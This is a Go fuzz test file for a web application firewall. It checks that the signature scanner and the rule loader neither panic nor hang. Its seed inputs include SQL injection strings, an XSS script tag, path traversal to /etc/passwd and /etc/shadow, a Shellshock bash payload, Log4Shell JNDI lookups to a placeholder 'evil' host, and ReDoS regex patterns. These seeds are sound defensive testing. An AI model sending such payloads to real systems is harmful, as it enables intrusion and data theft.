package waf

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

// scanBudget is the wall-clock ceiling for a single Scan() call. Go's regexp is
// RE2 (linear time, no backtracking) so catastrophic ReDoS should be impossible,
// but the budget turns any pathological input into a reportable failure instead
// of a silent hang.
const scanBudget = 5 * time.Second

// newDefaultEngine builds an Engine loaded with the full built-in signature set
// (200+ patterns) by pointing NewEngine at a path that cannot exist, which makes
// it fall back to loadDefaultSignatures().
func newDefaultEngine(t testing.TB) *Engine {
	t.Helper()
	e, err := NewEngine(filepath.Join(t.TempDir(), "nonexistent-signatures.json"), 5.0, 1.0)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	if len(e.signatures) == 0 {
		t.Fatal("expected default signatures to be loaded")
	}
	return e
}

// FuzzEngineScan drives the primary WAF signature-matching path with arbitrary
// request components. A panic here means an attacker can crash the WAF with a
// single request.
func FuzzEngineScan(f *testing.F) {
	e := newDefaultEngine(f)

	seeds := []struct {
		path, query, body, hdrName, hdrValue, ua string
	}{
		{"/", "", "", "Accept", "*/*", "Mozilla/5.0"},
		{"/login", "id=1' OR '1'='1", "", "Content-Type", "application/json", "sqlmap/1.7"},
		{"/search", "q=<script>alert(1)</script>", "", "Referer", "http://x/", "curl/8.0"},
		{"/api", "", "'; DROP TABLE users;--", "X-Forwarded-For", "1.2.3.4", ""},
		{"/../../etc/passwd", "f=../../../../etc/shadow", "", "Cookie", "a=b", "Nmap Scripting Engine"},
		{"/cgi-bin/x", "", "() { :;}; /bin/bash -c 'id'", "User-Agent", "() { :;};", "() { :;};"},
		{"/x", "q=${jndi:ldap://evil/a}", "{\"a\":\"${jndi:rmi://x}\"}", "X-Api-Version", "${jndi:dns://y}", "${jndi:ldap://z}"},
		{"\x00\x01\x02", "\xff\xfe", "\xed\xa0\x80", "\x7f", "\v\f", "‮"},
		{"/" + string(make([]byte, 4096)), "", "", "", "", ""},
	}
	for _, s := range seeds {
		f.Add(s.path, s.query, s.body, s.hdrName, s.hdrValue, s.ua)
	}

	f.Fuzz(func(t *testing.T, path, query, body, hdrName, hdrValue, ua string) {
		headers := map[string]string{hdrName: hdrValue}

		start := time.Now()
		res := e.Scan(path, query, body, headers, ua)
		elapsed := time.Since(start)

		if elapsed > scanBudget {
			t.Fatalf("Scan exceeded budget: %v (path=%q query=%q body=%q ua=%q)",
				elapsed, path, query, body, ua)
		}
		if res == nil {
			t.Fatal("Scan returned nil ScanResult")
		}
		// Invariant: whenever matches exist, the result must be fully populated.
		// A match with a nil Signature would nil-deref in highestSeverity/Reason.
		if len(res.Matches) > 0 {
			if res.Severity == "" {
				t.Fatalf("matches present but Severity empty (%d matches)", len(res.Matches))
			}
			for i, m := range res.Matches {
				if m.Signature == nil {
					t.Fatalf("match %d has nil Signature", i)
				}
			}
		}
	})
}

// FuzzLoadEvolvedRules fuzzes the evolved-rules JSON loader. Evolved rules are
// machine-generated from observed traffic, so their `pattern` field is the most
// attacker-influenced string that ever reaches regexp.Compile in this codebase.
func FuzzLoadEvolvedRules(f *testing.F) {
	seeds := [][]byte{
		[]byte(`[]`),
		[]byte(`[{"rule_id":"1","name":"n","pattern":"abc","match_target":"path","action":"BLOCK","score":80}]`),
		[]byte(`[{"rule_id":"2","name":"n","pattern":"(","match_target":"all","action":"LOG","score":10}]`),
		[]byte(`[{"rule_id":"3","name":"n","pattern":"(a+)+$","match_target":"query","action":"BLOCK","score":-999}]`),
		[]byte(`[{"rule_id":"4","pattern":"a{999999999}","match_target":"body","score":2147483647}]`),
		[]byte(`[{"rule_id":"","name":"","pattern":"","match_target":"","action":"","score":0}]`),
		[]byte(`[null]`),
		[]byte(`{"not":"an array"}`),
		[]byte(`[{"pattern":"\\p{Bogus}"}]`),
		[]byte(`[{"pattern":"(?P<n>a)(?P<n>b)"}]`),
		[]byte("\x00\xff not json"),
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		e := newDefaultEngine(t)

		path := filepath.Join(t.TempDir(), "evolved-rules.json")
		if err := os.WriteFile(path, data, 0o600); err != nil {
			t.Skip()
		}

		// Errors are expected for malformed input; panics are not.
		n, err := e.LoadEvolvedRules(path)
		if err == nil && n < 0 {
			t.Fatalf("negative loaded count: %d", n)
		}

		// Loading must never leave a signature with a nil regex in the table,
		// because Scan dereferences sig.regex unconditionally.
		e.lock.RLock()
		for i, sig := range e.signatures {
			if sig == nil {
				e.lock.RUnlock()
				t.Fatalf("nil signature at index %d after load", i)
			}
			if sig.regex == nil {
				e.lock.RUnlock()
				t.Fatalf("signature %q has nil regex after load (pattern=%q)", sig.ID, sig.Pattern)
			}
		}
		e.lock.RUnlock()

		// Scanning after a load must stay panic-free.
		e.Scan("/a", "b=c", "body", map[string]string{"X": "y"}, "ua")
		_ = e.GetEvolvedRulesCount()
	})
}
